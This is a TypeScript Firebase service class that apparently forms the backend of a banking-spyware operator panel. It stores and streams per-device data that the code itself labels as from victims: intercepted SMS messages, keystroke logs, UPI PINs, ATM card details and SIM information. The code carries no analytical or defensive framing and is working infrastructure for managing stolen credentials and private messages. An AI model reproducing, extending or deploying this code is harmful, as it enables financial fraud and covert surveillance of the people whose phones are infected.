import { 
  ref, 
  get, 
  set, 
  push, 
  update, 
  remove, 
  onValue, 
  off,
  query,
  orderByChild,
  equalTo,
  DatabaseReference,
  DataSnapshot
} from 'firebase/database';
import { database } from './firebase';
import { DeviceInfo, Message, SimRow, KeyLog, ATMCard } from '@/data/db';

export class FirebaseService {
  private static instance: FirebaseService;
  
  // Database references
  private deviceInfoRef: DatabaseReference;
  private messagesRef: DatabaseReference;
  private simsRef: DatabaseReference;
  private keyLogsRef: DatabaseReference;
  private upiPinsRef: DatabaseReference;
  private atmCardsRef: DatabaseReference;

  private constructor() {
    this.deviceInfoRef = ref(database, 'DeviceInfo');
    this.messagesRef = ref(database, 'Messages');
    this.simsRef = ref(database, 'Sims');
    this.keyLogsRef = ref(database, 'KeyLogs');
    this.upiPinsRef = ref(database, 'UPIPins');
    this.atmCardsRef = ref(database, 'ATMCards');
  }

  public static getInstance(): FirebaseService {
    if (!FirebaseService.instance) {
      FirebaseService.instance = new FirebaseService();
    }
    return FirebaseService.instance;
  }

  // Device Management
  async getDevices(): Promise<Record<string, DeviceInfo>> {
    try {
      const snapshot = await get(this.deviceInfoRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error('Error fetching devices:', error);
      return {};
    }
  }

  async getDevice(deviceId: string): Promise<DeviceInfo | null> {
    try {
      const snapshot = await get(ref(database, `DeviceInfo/${deviceId}`));
      return snapshot.val() || null;
    } catch (error) {
      console.error('Error fetching device:', error);
      return null;
    }
  }

  async addDevice(deviceId: string, deviceInfo: DeviceInfo): Promise<void> {
    try {
      await set(ref(database, `DeviceInfo/${deviceId}`), deviceInfo);
    } catch (error) {
      console.error('Error adding device:', error);
      throw error;
    }
  }

  async updateDevice(deviceId: string, updates: Partial<DeviceInfo>): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), updates);
    } catch (error) {
      console.error('Error updating device:', error);
      throw error;
    }
  }

  async deleteDevice(deviceId: string): Promise<void> {
    try {
      await remove(ref(database, `DeviceInfo/${deviceId}`));
    } catch (error) {
      console.error('Error deleting device:', error);
      throw error;
    }
  }

  // Real-time device monitoring
  onDeviceUpdate(deviceId: string, callback: (device: DeviceInfo | null) => void): () => void {
    const deviceRef = ref(database, `DeviceInfo/${deviceId}`);
    
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const device = snapshot.val();
      callback(device);
    };

    onValue(deviceRef, handleSnapshot);
    
    // Return unsubscribe function
    return () => off(deviceRef, 'value', handleSnapshot);
  }

  onDevicesUpdate(callback: (devices: Record<string, DeviceInfo>) => void): () => void {
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const devices = snapshot.val() || {};
      callback(devices);
    };

    onValue(this.deviceInfoRef, handleSnapshot);
    
    // Return unsubscribe function
    return () => off(this.deviceInfoRef, 'value', handleSnapshot);
  }

  // Messages
  async getMessages(): Promise<Record<string, Message>> {
    try {
      const snapshot = await get(this.messagesRef);
      return snapshot.val() || {};
    } catch (error) {
      console.error('Error fetching messages:', error);
      return {};
    }
  }

  // Get recent messages with limit for performance
  async getRecentMessages(limit: number = 50): Promise<Record<string, Message>> {
    try {
      const messagesQuery = query(
        this.messagesRef,
        orderByChild('Time')
      );
      const snapshot = await get(messagesQuery);
      const allMessages = snapshot.val() || {};
      
      // Convert to array, sort by time, and take the most recent
      const sortedMessages = Object.entries(allMessages)
        .sort(([,a], [,b]) => new Date((b as Message).Time).getTime() - new Date((a as Message).Time).getTime())
        .slice(0, limit);
      
      return Object.fromEntries(sortedMessages) as Record<string, Message>;
    } catch (error) {
      console.error('Error fetching recent messages:', error);
      return {};
    }
  }

  // Get messages for a specific victim with pagination
  async getVictimMessages(victimId: string, limit: number = 50): Promise<Message[]> {
    try {
      const messagesQuery = query(
        this.messagesRef,
        orderByChild('VictimId'),
        equalTo(victimId)
      );
      const snapshot = await get(messagesQuery);
      const messages = snapshot.val();
      
      if (!messages) return [];
      
      // Sort by time and limit results
      return (Object.values(messages) as Message[])
        .sort((a: Message, b: Message) => new Date(b.Time).getTime() - new Date(a.Time).getTime())
        .slice(0, limit);
    } catch (error) {
      console.error('Error fetching victim messages:', error);
      return [];
    }
  }

  async getDeviceMessages(deviceId: string): Promise<Message[]> {
    try {
      const messagesQuery = query(
        this.messagesRef,
        orderByChild('VictimId'),
        equalTo(deviceId)
      );
      const snapshot = await get(messagesQuery);
      const messages = snapshot.val();
      return messages ? (Object.values(messages) as Message[]) : [];
    } catch (error) {
      console.error('Error fetching device messages:', error);
      return [];
    }
  }

  async addMessage(message: Omit<Message, 'id'>): Promise<string> {
    try {
      const newMessageRef = push(this.messagesRef);
      const messageId = newMessageRef.key!;
      await set(newMessageRef, { ...message, id: messageId });
      return messageId;
    } catch (error) {
      console.error('Error adding message:', error);
      throw error;
    }
  }

  // Real-time message monitoring
  onMessagesUpdate(callback: (messages: Record<string, Message>) => void): () => void {
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const messages = snapshot.val() || {};
      callback(messages);
    };

    onValue(this.messagesRef, handleSnapshot);
    
    return () => off(this.messagesRef, 'value', handleSnapshot);
  }

  onDeviceMessagesUpdate(deviceId: string, callback: (messages: Message[]) => void): () => void {
    const messagesQuery = query(
      this.messagesRef,
      orderByChild('VictimId'),
      equalTo(deviceId)
    );
    
    const handleSnapshot = (snapshot: DataSnapshot) => {
      const messages = snapshot.val();
      const messageList = messages ? (Object.values(messages) as Message[]) : [];
      callback(messageList);
    };

    onValue(messagesQuery, handleSnapshot);
    
    return () => off(messagesQuery, 'value', handleSnapshot);
  }

  // SIM Cards
  async getSims(deviceId: string): Promise<SimRow[]> {
    try {
      const snapshot = await get(ref(database, `Sims/${deviceId}`));
      return snapshot.val() || [];
    } catch (error) {
      console.error('Error fetching SIMs:', error);
      return [];
    }
  }

  async updateSims(deviceId: string, sims: SimRow[]): Promise<void> {
    try {
      await set(ref(database, `Sims/${deviceId}`), sims);
    } catch (error) {
      console.error('Error updating SIMs:', error);
      throw error;
    }
  }

  // Key Logs
  // Get key logs with pagination support
  async getKeyLogs(deviceId: string, limit: number = 100): Promise<KeyLog[]> {
    try {
      const keyLogsQuery = query(
        ref(database, `KeyLogs/${deviceId}`),
        orderByChild('time')
      );
      const snapshot = await get(keyLogsQuery);
      const keyLogs = snapshot.val();
      
      if (!keyLogs) return [];
      
      // Sort by time (newest first) and limit results
      return (Object.values(keyLogs) as KeyLog[])
        .sort((a: KeyLog, b: KeyLog) => new Date(b.time).getTime() - new Date(a.time).getTime())
        .slice(0, limit);
    } catch (error) {
      console.error('Error fetching key logs:', error);
      return [];
    }
  }

  async addKeyLog(deviceId: string, keyLog: Omit<KeyLog, 'id'>): Promise<void> {
    try {
      const newKeyLogRef = push(ref(database, `KeyLogs/${deviceId}`));
      await set(newKeyLogRef, keyLog);
    } catch (error) {
      console.error('Error adding key log:', error);
      throw error;
    }
  }

  // UPI Pins
  async getUPIPins(deviceId: string): Promise<string[]> {
    try {
      const snapshot = await get(ref(database, `UPIPins/${deviceId}`));
      return snapshot.val() || [];
    } catch (error) {
      console.error('Error fetching UPI pins:', error);
      return [];
    }
  }

  async updateUPIPins(deviceId: string, pins: string[]): Promise<void> {
    try {
      await set(ref(database, `UPIPins/${deviceId}`), pins);
    } catch (error) {
      console.error('Error updating UPI pins:', error);
      throw error;
    }
  }

  // ATM Cards
  async getATMCards(deviceId: string): Promise<ATMCard[]> {
    try {
      const snapshot = await get(ref(database, `ATMCards/${deviceId}`));
      return snapshot.val() || [];
    } catch (error) {
      console.error('Error fetching ATM cards:', error);
      return [];
    }
  }

  async updateATMCards(deviceId: string, cards: ATMCard[]): Promise<void> {
    try {
      await set(ref(database, `ATMCards/${deviceId}`), cards);
    } catch (error) {
      console.error('Error updating ATM cards:', error);
      throw error;
    }
  }

  // Device Status Updates
  async updateDeviceStatus(deviceId: string, status: string): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), { Status: status });
    } catch (error) {
      console.error('Error updating device status:', error);
      throw error;
    }
  }

  async updateDeviceBattery(deviceId: string, battery: string): Promise<void> {
    try {
      await update(ref(database, `DeviceInfo/${deviceId}`), { Battery: battery });
    } catch (error) {
      console.error('Error updating device battery:', error);
      throw error;
    }
  }

  // Initialize empty collections (for first-time setup)
  async initializeEmptyCollections(): Promise<void> {
    try {
      const devices = await this.getDevices();
      if (Object.keys(devices).length === 0) {
        // Initialize with empty collections
        await set(ref(database, 'DeviceInfo'), {});
        await set(ref(database, 'Messages'), {});
        await set(ref(database, 'Sims'), {});
        await set(ref(database, 'KeyLogs'), {});
        await set(ref(database, 'UPIPins'), {});
        await set(ref(database, 'ATMCards'), {});
        console.log('Firebase collections initialized successfully');
      }
    } catch (error) {
      console.error('Error initializing collections:', error);
    }
  }
}

export const firebaseService = FirebaseService.getInstance();
